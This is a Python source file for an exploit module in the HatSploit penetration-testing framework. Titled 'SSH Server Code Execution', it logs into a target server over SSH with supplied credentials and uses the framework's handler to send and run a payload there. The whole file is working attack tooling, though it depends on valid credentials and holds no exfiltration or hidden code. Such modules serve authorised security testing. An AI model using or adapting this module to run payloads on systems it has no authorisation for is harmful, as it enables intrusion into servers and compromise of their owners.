"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from pex.proto.ssh import SSHClient


class HatSploitModule(Module, SSHClient, Handler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "SSH Server Code Execution",
            'Module': "exploit/generic/ssh/server_code_execution",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Execute code on server with SSH enabled.",
            'Platform': "generic",
            'Rank': "medium",
        }

        self.payload = {
            'Value': None,
            'Architectures': None,
            'Platforms': None,
            'Action': "phaseless",
            'Types': None
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 22,
                'Type': "port",
                'Required': True,
            },
            'USERNAME': {
                'Description': "SSH username.",
                'Value': None,
                'Type': None,
                'Required': True,
            },
            'PASSWORD': {
                'Description': "SSH password.",
                'Value': None,
                'Type': None,
                'Required': True,
            },
        }

    def run(self):
        remote_host, remote_port, username, password = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")

        client = self.open_ssh(remote_host, remote_port, username, password)
        client.connect()

        self.module_handle(
            module=self,
            sender=client.send_command
        )

        client.disconnect()
